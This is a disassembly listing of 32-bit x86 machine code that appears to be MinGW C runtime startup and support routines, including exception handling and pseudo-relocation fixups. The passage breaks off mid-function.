  409600:	89 04 24             	mov    %eax,(%esp)
  409603:	e8 f8 0b 00 00       	call   0x40a200
  409608:	b8 01 00 00 00       	mov    $0x1,%eax
  40960d:	83 c4 1c             	add    $0x1c,%esp
  409610:	c2 0c 00             	ret    $0xc
  409613:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409619:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  409620:	53                   	push   %ebx
  409621:	83 ec 18             	sub    $0x18,%esp
  409624:	83 3d 1c b0 40 00 02 	cmpl   $0x2,0x40b01c
  40962b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40962f:	74 0a                	je     0x40963b
  409631:	c7 05 1c b0 40 00 02 	movl   $0x2,0x40b01c
  409638:	00 00 00 
  40963b:	83 f8 02             	cmp    $0x2,%eax
  40963e:	74 11                	je     0x409651
  409640:	83 f8 01             	cmp    $0x1,%eax
  409643:	74 3b                	je     0x409680
  409645:	83 c4 18             	add    $0x18,%esp
  409648:	b8 01 00 00 00       	mov    $0x1,%eax
  40964d:	5b                   	pop    %ebx
  40964e:	c2 0c 00             	ret    $0xc
  409651:	bb 30 00 42 00       	mov    $0x420030,%ebx
  409656:	81 fb 30 00 42 00    	cmp    $0x420030,%ebx
  40965c:	74 e7                	je     0x409645
  40965e:	66 90                	xchg   %ax,%ax
  409660:	8b 03                	mov    (%ebx),%eax
  409662:	85 c0                	test   %eax,%eax
  409664:	74 02                	je     0x409668
  409666:	ff d0                	call   *%eax
  409668:	83 c3 04             	add    $0x4,%ebx
  40966b:	81 fb 30 00 42 00    	cmp    $0x420030,%ebx
  409671:	75 ed                	jne    0x409660
  409673:	83 c4 18             	add    $0x18,%esp
  409676:	b8 01 00 00 00       	mov    $0x1,%eax
  40967b:	5b                   	pop    %ebx
  40967c:	c2 0c 00             	ret    $0xc
  40967f:	90                   	nop
  409680:	8b 44 24 28          	mov    0x28(%esp),%eax
  409684:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40968b:	00 
  40968c:	89 44 24 08          	mov    %eax,0x8(%esp)
  409690:	8b 44 24 20          	mov    0x20(%esp),%eax
  409694:	89 04 24             	mov    %eax,(%esp)
  409697:	e8 64 0b 00 00       	call   0x40a200
  40969c:	eb a7                	jmp    0x409645
  40969e:	66 90                	xchg   %ax,%ax
  4096a0:	31 c0                	xor    %eax,%eax
  4096a2:	c3                   	ret
  4096a3:	90                   	nop
  4096a4:	90                   	nop
  4096a5:	90                   	nop
  4096a6:	90                   	nop
  4096a7:	90                   	nop
  4096a8:	90                   	nop
  4096a9:	90                   	nop
  4096aa:	90                   	nop
  4096ab:	90                   	nop
  4096ac:	90                   	nop
  4096ad:	90                   	nop
  4096ae:	90                   	nop
  4096af:	90                   	nop
  4096b0:	a1 c0 f2 41 00       	mov    0x41f2c0,%eax
  4096b5:	ff e0                	jmp    *%eax
  4096b7:	90                   	nop
  4096b8:	90                   	nop
  4096b9:	90                   	nop
  4096ba:	90                   	nop
  4096bb:	90                   	nop
  4096bc:	90                   	nop
  4096bd:	90                   	nop
  4096be:	90                   	nop
  4096bf:	90                   	nop
  4096c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4096c4:	c3                   	ret
  4096c5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4096c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4096d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4096d4:	c3                   	ret
  4096d5:	90                   	nop
  4096d6:	90                   	nop
  4096d7:	90                   	nop
  4096d8:	90                   	nop
  4096d9:	90                   	nop
  4096da:	90                   	nop
  4096db:	90                   	nop
  4096dc:	90                   	nop
  4096dd:	90                   	nop
  4096de:	90                   	nop
  4096df:	90                   	nop
  4096e0:	53                   	push   %ebx
  4096e1:	83 ec 28             	sub    $0x28,%esp
  4096e4:	a1 7c e6 41 00       	mov    0x41e67c,%eax
  4096e9:	89 04 24             	mov    %eax,(%esp)
  4096ec:	e8 cf ff ff ff       	call   0x4096c0
  4096f1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4096f4:	89 44 24 18          	mov    %eax,0x18(%esp)
  4096f8:	0f 84 82 00 00 00    	je     0x409780
  4096fe:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  409705:	e8 96 12 00 00       	call   0x40a9a0
  40970a:	a1 7c e6 41 00       	mov    0x41e67c,%eax
  40970f:	89 04 24             	mov    %eax,(%esp)
  409712:	e8 a9 ff ff ff       	call   0x4096c0
  409717:	89 44 24 18          	mov    %eax,0x18(%esp)
  40971b:	a1 78 e6 41 00       	mov    0x41e678,%eax
  409720:	89 04 24             	mov    %eax,(%esp)
  409723:	e8 98 ff ff ff       	call   0x4096c0
  409728:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40972c:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  409730:	89 44 24 08          	mov    %eax,0x8(%esp)
  409734:	8d 44 24 18          	lea    0x18(%esp),%eax
  409738:	89 44 24 04          	mov    %eax,0x4(%esp)
  40973c:	8b 44 24 30          	mov    0x30(%esp),%eax
  409740:	89 04 24             	mov    %eax,(%esp)
  409743:	e8 60 12 00 00       	call   0x40a9a8
  409748:	89 c3                	mov    %eax,%ebx
  40974a:	8b 44 24 18          	mov    0x18(%esp),%eax
  40974e:	89 04 24             	mov    %eax,(%esp)
  409751:	e8 7a ff ff ff       	call   0x4096d0
  409756:	a3 7c e6 41 00       	mov    %eax,0x41e67c
  40975b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40975f:	89 04 24             	mov    %eax,(%esp)
  409762:	e8 69 ff ff ff       	call   0x4096d0
  409767:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  40976e:	a3 78 e6 41 00       	mov    %eax,0x41e678
  409773:	e8 38 12 00 00       	call   0x40a9b0
  409778:	83 c4 28             	add    $0x28,%esp
  40977b:	89 d8                	mov    %ebx,%eax
  40977d:	5b                   	pop    %ebx
  40977e:	c3                   	ret
  40977f:	90                   	nop
  409780:	8b 44 24 30          	mov    0x30(%esp),%eax
  409784:	89 04 24             	mov    %eax,(%esp)
  409787:	ff 15 10 f3 41 00    	call   *0x41f310
  40978d:	83 c4 28             	add    $0x28,%esp
  409790:	5b                   	pop    %ebx
  409791:	c3                   	ret
  409792:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  409799:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4097a0:	83 ec 1c             	sub    $0x1c,%esp
  4097a3:	8b 44 24 20          	mov    0x20(%esp),%eax
  4097a7:	89 04 24             	mov    %eax,(%esp)
  4097aa:	e8 31 ff ff ff       	call   0x4096e0
  4097af:	85 c0                	test   %eax,%eax
  4097b1:	0f 94 c0             	sete   %al
  4097b4:	83 c4 1c             	add    $0x1c,%esp
  4097b7:	0f b6 c0             	movzbl %al,%eax
  4097ba:	f7 d8                	neg    %eax
  4097bc:	c3                   	ret
  4097bd:	90                   	nop
  4097be:	90                   	nop
  4097bf:	90                   	nop
  4097c0:	55                   	push   %ebp
  4097c1:	89 e5                	mov    %esp,%ebp
  4097c3:	56                   	push   %esi
  4097c4:	53                   	push   %ebx
  4097c5:	83 ec 10             	sub    $0x10,%esp
  4097c8:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4097cb:	8b 03                	mov    (%ebx),%eax
  4097cd:	8b 00                	mov    (%eax),%eax
  4097cf:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  4097d4:	77 42                	ja     0x409818
  4097d6:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  4097db:	0f 83 9f 00 00 00    	jae    0x409880
  4097e1:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  4097e6:	0f 85 9b 00 00 00    	jne    0x409887
  4097ec:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4097f3:	00 
  4097f4:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  4097fb:	e8 90 11 00 00       	call   0x40a990
  409800:	83 f8 01             	cmp    $0x1,%eax
  409803:	0f 84 ad 00 00 00    	je     0x4098b6
  409809:	85 c0                	test   %eax,%eax
  40980b:	74 20                	je     0x40982d
  40980d:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  409814:	ff d0                	call   *%eax
  409816:	eb 55                	jmp    0x40986d
  409818:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  40981d:	74 22                	je     0x409841
  40981f:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  409824:	74 68                	je     0x40988e
  409826:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  40982b:	74 53                	je     0x409880
  40982d:	a1 e4 e2 41 00       	mov    0x41e2e4,%eax
  409832:	85 c0                	test   %eax,%eax
  409834:	74 3c                	je     0x409872
  409836:	89 5d 08             	mov    %ebx,0x8(%ebp)
  409839:	8d 65 f8             	lea    -0x8(%ebp),%esp
  40983c:	5b                   	pop    %ebx
  40983d:	5e                   	pop    %esi
  40983e:	5d                   	pop    %ebp
  40983f:	ff e0                	jmp    *%eax
  409841:	31 f6                	xor    %esi,%esi
  409843:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40984a:	00 
  40984b:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  409852:	e8 39 11 00 00       	call   0x40a990
  409857:	83 f8 01             	cmp    $0x1,%eax
  40985a:	0f 84 86 00 00 00    	je     0x4098e6
  409860:	85 c0                	test   %eax,%eax
  409862:	74 c9                	je     0x40982d
  409864:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  40986b:	ff d0                	call   *%eax
  40986d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  409872:	8d 65 f8             	lea    -0x8(%ebp),%esp
  409875:	5b                   	pop    %ebx
  409876:	5e                   	pop    %esi
  409877:	5d                   	pop    %ebp
  409878:	c2 04 00             	ret    $0x4
  40987b:	90                   	nop
  40987c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409880:	be 01 00 00 00       	mov    $0x1,%esi
  409885:	eb bc                	jmp    0x409843
  409887:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40988c:	75 9f                	jne    0x40982d
  40988e:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  409895:	00 
  409896:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  40989d:	e8 ee 10 00 00       	call   0x40a990
  4098a2:	83 f8 01             	cmp    $0x1,%eax
  4098a5:	74 29                	je     0x4098d0
  4098a7:	85 c0                	test   %eax,%eax
  4098a9:	74 82                	je     0x40982d
  4098ab:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  4098b2:	ff d0                	call   *%eax
  4098b4:	eb b7                	jmp    0x40986d
  4098b6:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4098bd:	00 
  4098be:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  4098c5:	e8 c6 10 00 00       	call   0x40a990
  4098ca:	eb a1                	jmp    0x40986d
  4098cc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4098d0:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4098d7:	00 
  4098d8:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  4098df:	e8 ac 10 00 00       	call   0x40a990
  4098e4:	eb 87                	jmp    0x40986d
  4098e6:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4098ed:	00 
  4098ee:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  4098f5:	e8 96 10 00 00       	call   0x40a990
  4098fa:	85 f6                	test   %esi,%esi
  4098fc:	0f 84 6b ff ff ff    	je     0x40986d
  409902:	e8 19 05 00 00       	call   0x409e20
  409907:	e9 61 ff ff ff       	jmp    0x40986d
  40990c:	90                   	nop
  40990d:	90                   	nop
  40990e:	90                   	nop
  40990f:	90                   	nop
  409910:	31 c0                	xor    %eax,%eax
  409912:	c3                   	ret
  409913:	90                   	nop
  409914:	90                   	nop
  409915:	90                   	nop
  409916:	90                   	nop
  409917:	90                   	nop
  409918:	90                   	nop
  409919:	90                   	nop
  40991a:	90                   	nop
  40991b:	90                   	nop
  40991c:	90                   	nop
  40991d:	90                   	nop
  40991e:	90                   	nop
  40991f:	90                   	nop
  409920:	83 ec 3c             	sub    $0x3c,%esp
  409923:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  409928:	dd 44 24 48          	fldl   0x48(%esp)
  40992c:	dd 44 24 50          	fldl   0x50(%esp)
  409930:	dd 44 24 58          	fldl   0x58(%esp)
  409934:	85 c0                	test   %eax,%eax
  409936:	74 29                	je     0x409961
  409938:	d9 ca                	fxch   %st(2)
  40993a:	8b 54 24 40          	mov    0x40(%esp),%edx
  40993e:	dd 5c 24 18          	fstpl  0x18(%esp)
  409942:	dd 5c 24 20          	fstpl  0x20(%esp)
  409946:	dd 5c 24 28          	fstpl  0x28(%esp)
  40994a:	89 54 24 10          	mov    %edx,0x10(%esp)
  40994e:	8b 54 24 44          	mov    0x44(%esp),%edx
  409952:	89 54 24 14          	mov    %edx,0x14(%esp)
  409956:	8d 54 24 10          	lea    0x10(%esp),%edx
  40995a:	89 14 24             	mov    %edx,(%esp)
  40995d:	ff d0                	call   *%eax
  40995f:	eb 06                	jmp    0x409967
  409961:	dd d8                	fstp   %st(0)
  409963:	dd d8                	fstp   %st(0)
  409965:	dd d8                	fstp   %st(0)
  409967:	83 c4 3c             	add    $0x3c,%esp
  40996a:	c3                   	ret
  40996b:	90                   	nop
  40996c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409970:	8b 44 24 04          	mov    0x4(%esp),%eax
  409974:	a3 e8 e2 41 00       	mov    %eax,0x41e2e8
  409979:	e9 3a 10 00 00       	jmp    0x40a9b8
  40997e:	66 90                	xchg   %ax,%ax
  409980:	83 ec 3c             	sub    $0x3c,%esp
  409983:	8b 44 24 40          	mov    0x40(%esp),%eax
  409987:	8b 10                	mov    (%eax),%edx
  409989:	8d 4a ff             	lea    -0x1(%edx),%ecx
  40998c:	ba 54 02 41 00       	mov    $0x410254,%edx
  409991:	83 f9 05             	cmp    $0x5,%ecx
  409994:	77 07                	ja     0x40999d
  409996:	8b 14 8d 70 03 41 00 	mov    0x410370(,%ecx,4),%edx
  40999d:	dd 40 18             	fldl   0x18(%eax)
  4099a0:	dd 5c 24 20          	fstpl  0x20(%esp)
  4099a4:	dd 40 10             	fldl   0x10(%eax)
  4099a7:	dd 5c 24 18          	fstpl  0x18(%esp)
  4099ab:	dd 40 08             	fldl   0x8(%eax)
  4099ae:	dd 5c 24 10          	fstpl  0x10(%esp)
  4099b2:	8b 40 04             	mov    0x4(%eax),%eax
  4099b5:	89 54 24 08          	mov    %edx,0x8(%esp)
  4099b9:	c7 44 24 04 64 02 41 	movl   $0x410264,0x4(%esp)
  4099c0:	00 
  4099c1:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4099c5:	a1 00 f3 41 00       	mov    0x41f300,%eax
  4099ca:	83 c0 40             	add    $0x40,%eax
  4099cd:	89 04 24             	mov    %eax,(%esp)
  4099d0:	e8 eb 0f 00 00       	call   0x40a9c0
  4099d5:	31 c0                	xor    %eax,%eax
  4099d7:	83 c4 3c             	add    $0x3c,%esp
  4099da:	c3                   	ret
  4099db:	90                   	nop
  4099dc:	90                   	nop
  4099dd:	90                   	nop
  4099de:	90                   	nop
  4099df:	90                   	nop
  4099e0:	53                   	push   %ebx
  4099e1:	83 ec 18             	sub    $0x18,%esp
  4099e4:	a1 00 f3 41 00       	mov    0x41f300,%eax
  4099e9:	c7 44 24 08 1b 00 00 	movl   $0x1b,0x8(%esp)
  4099f0:	00 
  4099f1:	8d 5c 24 24          	lea    0x24(%esp),%ebx
  4099f5:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4099fc:	00 
  4099fd:	c7 04 24 88 03 41 00 	movl   $0x410388,(%esp)
  409a04:	83 c0 40             	add    $0x40,%eax
  409a07:	89 44 24 0c          	mov    %eax,0xc(%esp)
  409a0b:	e8 90 0e 00 00       	call   0x40a8a0
  409a10:	8b 44 24 20          	mov    0x20(%esp),%eax
  409a14:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  409a18:	89 44 24 04          	mov    %eax,0x4(%esp)
  409a1c:	a1 00 f3 41 00       	mov    0x41f300,%eax
  409a21:	83 c0 40             	add    $0x40,%eax
  409a24:	89 04 24             	mov    %eax,(%esp)
  409a27:	e8 ac 0e 00 00       	call   0x40a8d8
  409a2c:	e8 97 0f 00 00       	call   0x40a9c8
  409a31:	eb 0d                	jmp    0x409a40
  409a33:	90                   	nop
  409a34:	90                   	nop
  409a35:	90                   	nop
  409a36:	90                   	nop
  409a37:	90                   	nop
  409a38:	90                   	nop
  409a39:	90                   	nop
  409a3a:	90                   	nop
  409a3b:	90                   	nop
  409a3c:	90                   	nop
  409a3d:	90                   	nop
  409a3e:	90                   	nop
  409a3f:	90                   	nop
  409a40:	55                   	push   %ebp
  409a41:	89 e5                	mov    %esp,%ebp
  409a43:	57                   	push   %edi
  409a44:	56                   	push   %esi
  409a45:	89 c6                	mov    %eax,%esi
  409a47:	53                   	push   %ebx
  409a48:	83 ec 3c             	sub    $0x3c,%esp
  409a4b:	a1 f0 e2 41 00       	mov    0x41e2f0,%eax
  409a50:	85 c0                	test   %eax,%eax
  409a52:	0f 8e eb 00 00 00    	jle    0x409b43
  409a58:	8b 15 f4 e2 41 00    	mov    0x41e2f4,%edx
  409a5e:	31 db                	xor    %ebx,%ebx
  409a60:	8b 4a 04             	mov    0x4(%edx),%ecx
  409a63:	39 f1                	cmp    %esi,%ecx
  409a65:	77 0a                	ja     0x409a71
  409a67:	8b 7a 08             	mov    0x8(%edx),%edi
  409a6a:	03 4f 08             	add    0x8(%edi),%ecx
  409a6d:	39 ce                	cmp    %ecx,%esi
  409a6f:	72 75                	jb     0x409ae6
  409a71:	83 c3 01             	add    $0x1,%ebx
  409a74:	83 c2 0c             	add    $0xc,%edx
  409a77:	39 c3                	cmp    %eax,%ebx
  409a79:	75 e5                	jne    0x409a60
  409a7b:	89 34 24             	mov    %esi,(%esp)
  409a7e:	e8 3d 09 00 00       	call   0x40a3c0
  409a83:	85 c0                	test   %eax,%eax
  409a85:	89 c7                	mov    %eax,%edi
  409a87:	0f 84 dd 00 00 00    	je     0x409b6a
  409a8d:	8d 34 5b             	lea    (%ebx,%ebx,2),%esi
  409a90:	8b 1d f4 e2 41 00    	mov    0x41e2f4,%ebx
  409a96:	c1 e6 02             	shl    $0x2,%esi
  409a99:	01 f3                	add    %esi,%ebx
  409a9b:	89 43 08             	mov    %eax,0x8(%ebx)
  409a9e:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  409aa4:	e8 07 0a 00 00       	call   0x40a4b0
  409aa9:	03 47 0c             	add    0xc(%edi),%eax
  409aac:	89 43 04             	mov    %eax,0x4(%ebx)
  409aaf:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409ab2:	89 44 24 04          	mov    %eax,0x4(%esp)
  409ab6:	a1 f4 e2 41 00       	mov    0x41e2f4,%eax
  409abb:	c7 44 24 08 1c 00 00 	movl   $0x1c,0x8(%esp)
  409ac2:	00 
  409ac3:	8b 44 30 04          	mov    0x4(%eax,%esi,1),%eax
  409ac7:	89 04 24             	mov    %eax,(%esp)
  409aca:	ff 15 a8 f2 41 00    	call   *0x41f2a8
  409ad0:	83 ec 0c             	sub    $0xc,%esp
  409ad3:	85 c0                	test   %eax,%eax
  409ad5:	74 73                	je     0x409b4a
  409ad7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409ada:	83 f8 40             	cmp    $0x40,%eax
  409add:	75 11                	jne    0x409af0
  409adf:	83 05 f0 e2 41 00 01 	addl   $0x1,0x41e2f0
  409ae6:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409ae9:	5b                   	pop    %ebx
  409aea:	5e                   	pop    %esi
  409aeb:	5f                   	pop    %edi
  409aec:	5d                   	pop    %ebp
  409aed:	c3                   	ret
  409aee:	66 90                	xchg   %ax,%ax
  409af0:	83 f8 04             	cmp    $0x4,%eax
  409af3:	74 ea                	je     0x409adf
  409af5:	3d 80 00 00 00       	cmp    $0x80,%eax
  409afa:	74 e3                	je     0x409adf
  409afc:	83 f8 08             	cmp    $0x8,%eax
  409aff:	74 de                	je     0x409adf
  409b01:	8b 45 d8             	mov    -0x28(%ebp),%eax
  409b04:	03 35 f4 e2 41 00    	add    0x41e2f4,%esi
  409b0a:	c7 44 24 08 40 00 00 	movl   $0x40,0x8(%esp)
  409b11:	00 
  409b12:	89 44 24 04          	mov    %eax,0x4(%esp)
  409b16:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409b19:	89 74 24 0c          	mov    %esi,0xc(%esp)
  409b1d:	89 04 24             	mov    %eax,(%esp)
  409b20:	ff 15 a4 f2 41 00    	call   *0x41f2a4
  409b26:	83 ec 10             	sub    $0x10,%esp
  409b29:	85 c0                	test   %eax,%eax
  409b2b:	75 b2                	jne    0x409adf
  409b2d:	ff 15 4c f2 41 00    	call   *0x41f24c
  409b33:	c7 04 24 f8 03 41 00 	movl   $0x4103f8,(%esp)
  409b3a:	89 44 24 04          	mov    %eax,0x4(%esp)
  409b3e:	e8 9d fe ff ff       	call   0x4099e0
  409b43:	31 db                	xor    %ebx,%ebx
  409b45:	e9 31 ff ff ff       	jmp    0x409a7b
  409b4a:	a1 f4 e2 41 00       	mov    0x41e2f4,%eax
  409b4f:	8b 44 30 04          	mov    0x4(%eax,%esi,1),%eax
  409b53:	89 44 24 08          	mov    %eax,0x8(%esp)
  409b57:	8b 47 08             	mov    0x8(%edi),%eax
  409b5a:	c7 04 24 c4 03 41 00 	movl   $0x4103c4,(%esp)
  409b61:	89 44 24 04          	mov    %eax,0x4(%esp)
  409b65:	e8 76 fe ff ff       	call   0x4099e0
  409b6a:	89 74 24 04          	mov    %esi,0x4(%esp)
  409b6e:	c7 04 24 a4 03 41 00 	movl   $0x4103a4,(%esp)
  409b75:	e8 66 fe ff ff       	call   0x4099e0
  409b7a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409b80:	a1 ec e2 41 00       	mov    0x41e2ec,%eax
  409b85:	85 c0                	test   %eax,%eax
  409b87:	74 07                	je     0x409b90
  409b89:	c3                   	ret
  409b8a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409b90:	55                   	push   %ebp
  409b91:	89 e5                	mov    %esp,%ebp
  409b93:	57                   	push   %edi
  409b94:	56                   	push   %esi
  409b95:	53                   	push   %ebx
  409b96:	83 ec 4c             	sub    $0x4c,%esp
  409b99:	c7 05 ec e2 41 00 01 	movl   $0x1,0x41e2ec
  409ba0:	00 00 00 
  409ba3:	e8 68 08 00 00       	call   0x40a410
  409ba8:	8d 04 40             	lea    (%eax,%eax,2),%eax
  409bab:	8d 04 85 1e 00 00 00 	lea    0x1e(,%eax,4),%eax
  409bb2:	83 e0 f0             	and    $0xfffffff0,%eax
  409bb5:	e8 26 0a 00 00       	call   0x40a5e0
  409bba:	c7 05 f0 e2 41 00 00 	movl   $0x0,0x41e2f0
  409bc1:	00 00 00 
  409bc4:	29 c4                	sub    %eax,%esp
  409bc6:	8d 44 24 1f          	lea    0x1f(%esp),%eax
  409bca:	83 e0 f0             	and    $0xfffffff0,%eax
  409bcd:	a3 f4 e2 41 00       	mov    %eax,0x41e2f4
  409bd2:	b8 08 10 41 00       	mov    $0x411008,%eax
  409bd7:	2d 08 10 41 00       	sub    $0x411008,%eax
  409bdc:	83 f8 07             	cmp    $0x7,%eax
  409bdf:	0f 8e 9b 00 00 00    	jle    0x409c80
  409be5:	83 f8 0b             	cmp    $0xb,%eax
  409be8:	0f 8e 55 01 00 00    	jle    0x409d43
  409bee:	a1 08 10 41 00       	mov    0x411008,%eax
  409bf3:	85 c0                	test   %eax,%eax
  409bf5:	0f 85 8d 00 00 00    	jne    0x409c88
  409bfb:	a1 0c 10 41 00       	mov    0x41100c,%eax
  409c00:	85 c0                	test   %eax,%eax
  409c02:	0f 85 80 00 00 00    	jne    0x409c88
  409c08:	8b 3d 10 10 41 00    	mov    0x411010,%edi
  409c0e:	bb 14 10 41 00       	mov    $0x411014,%ebx
  409c13:	85 ff                	test   %edi,%edi
  409c15:	0f 84 2d 01 00 00    	je     0x409d48
  409c1b:	bb 08 10 41 00       	mov    $0x411008,%ebx
  409c20:	8b 43 08             	mov    0x8(%ebx),%eax
  409c23:	83 f8 01             	cmp    $0x1,%eax
  409c26:	0f 85 e4 01 00 00    	jne    0x409e10
  409c2c:	83 c3 0c             	add    $0xc,%ebx
  409c2f:	81 fb 08 10 41 00    	cmp    $0x411008,%ebx
  409c35:	73 49                	jae    0x409c80
  409c37:	8b 0b                	mov    (%ebx),%ecx
  409c39:	8b 43 04             	mov    0x4(%ebx),%eax
  409c3c:	8d 91 00 00 40 00    	lea    0x400000(%ecx),%edx
  409c42:	8b b9 00 00 40 00    	mov    0x400000(%ecx),%edi
  409c48:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  409c4b:	0f b6 53 08          	movzbl 0x8(%ebx),%edx
  409c4f:	8d b0 00 00 40 00    	lea    0x400000(%eax),%esi
  409c55:	83 fa 10             	cmp    $0x10,%edx
  409c58:	0f 84 04 01 00 00    	je     0x409d62
  409c5e:	83 fa 20             	cmp    $0x20,%edx
  409c61:	0f 84 71 01 00 00    	je     0x409dd8
  409c67:	83 fa 08             	cmp    $0x8,%edx
  409c6a:	0f 84 3e 01 00 00    	je     0x409dae
  409c70:	89 54 24 04          	mov    %edx,0x4(%esp)
  409c74:	c7 04 24 54 04 41 00 	movl   $0x410454,(%esp)
  409c7b:	e8 60 fd ff ff       	call   0x4099e0
  409c80:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409c83:	5b                   	pop    %ebx
  409c84:	5e                   	pop    %esi
  409c85:	5f                   	pop    %edi
  409c86:	5d                   	pop    %ebp
  409c87:	c3                   	ret
  409c88:	bb 08 10 41 00       	mov    $0x411008,%ebx
  409c8d:	81 fb 08 10 41 00    	cmp    $0x411008,%ebx
  409c93:	73 eb                	jae    0x409c80
  409c95:	8b 73 04             	mov    0x4(%ebx),%esi
  409c98:	83 c3 08             	add    $0x8,%ebx
  409c9b:	8b 96 00 00 40 00    	mov    0x400000(%esi),%edx
  409ca1:	8d 86 00 00 40 00    	lea    0x400000(%esi),%eax
  409ca7:	03 53 f8             	add    -0x8(%ebx),%edx
  409caa:	89 55 cc             	mov    %edx,-0x34(%ebp)
  409cad:	e8 8e fd ff ff       	call   0x409a40
  409cb2:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409cb5:	81 fb 08 10 41 00    	cmp    $0x411008,%ebx
  409cbb:	89 86 00 00 40 00    	mov    %eax,0x400000(%esi)
  409cc1:	72 d2                	jb     0x409c95
  409cc3:	a1 f0 e2 41 00       	mov    0x41e2f0,%eax
  409cc8:	31 db                	xor    %ebx,%ebx
  409cca:	85 c0                	test   %eax,%eax
  409ccc:	7f 0d                	jg     0x409cdb
  409cce:	eb b0                	jmp    0x409c80
  409cd0:	83 c3 01             	add    $0x1,%ebx
  409cd3:	3b 1d f0 e2 41 00    	cmp    0x41e2f0,%ebx
  409cd9:	7d a5                	jge    0x409c80
  409cdb:	a1 f4 e2 41 00       	mov    0x41e2f4,%eax
  409ce0:	8d 3c 5b             	lea    (%ebx,%ebx,2),%edi
  409ce3:	8d 34 bd 00 00 00 00 	lea    0x0(,%edi,4),%esi
  409cea:	01 f0                	add    %esi,%eax
  409cec:	8b 10                	mov    (%eax),%edx
  409cee:	85 d2                	test   %edx,%edx
  409cf0:	74 de                	je     0x409cd0
  409cf2:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409cf5:	c7 44 24 08 1c 00 00 	movl   $0x1c,0x8(%esp)
  409cfc:	00 
  409cfd:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  409d01:	8b 40 04             	mov    0x4(%eax),%eax
  409d04:	89 04 24             	mov    %eax,(%esp)
  409d07:	ff 15 a8 f2 41 00    	call   *0x41f2a8
  409d0d:	83 ec 0c             	sub    $0xc,%esp
  409d10:	85 c0                	test   %eax,%eax
  409d12:	0f 84 d3 00 00 00    	je     0x409deb
  409d18:	8d 45 c8             	lea    -0x38(%ebp),%eax
  409d1b:	89 44 24 0c          	mov    %eax,0xc(%esp)
  409d1f:	a1 f4 e2 41 00       	mov    0x41e2f4,%eax
  409d24:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  409d27:	89 44 24 08          	mov    %eax,0x8(%esp)
  409d2b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  409d2e:	89 44 24 04          	mov    %eax,0x4(%esp)
  409d32:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409d35:	89 04 24             	mov    %eax,(%esp)
  409d38:	ff 15 a4 f2 41 00    	call   *0x41f2a4
  409d3e:	83 ec 10             	sub    $0x10,%esp
  409d41:	eb 8d                	jmp    0x409cd0
  409d43:	bb 08 10 41 00       	mov    $0x411008,%ebx
  409d48:	8b 33                	mov    (%ebx),%esi
  409d4a:	85 f6                	test   %esi,%esi
  409d4c:	0f 85 3b ff ff ff    	jne    0x409c8d
  409d52:	8b 4b 04             	mov    0x4(%ebx),%ecx
  409d55:	85 c9                	test   %ecx,%ecx
  409d57:	0f 84 c3 fe ff ff    	je     0x409c20
  409d5d:	e9 2b ff ff ff       	jmp    0x409c8d
  409d62:	0f b7 80 00 00 40 00 	movzwl 0x400000(%eax),%eax
  409d69:	0f b7 d0             	movzwl %ax,%edx
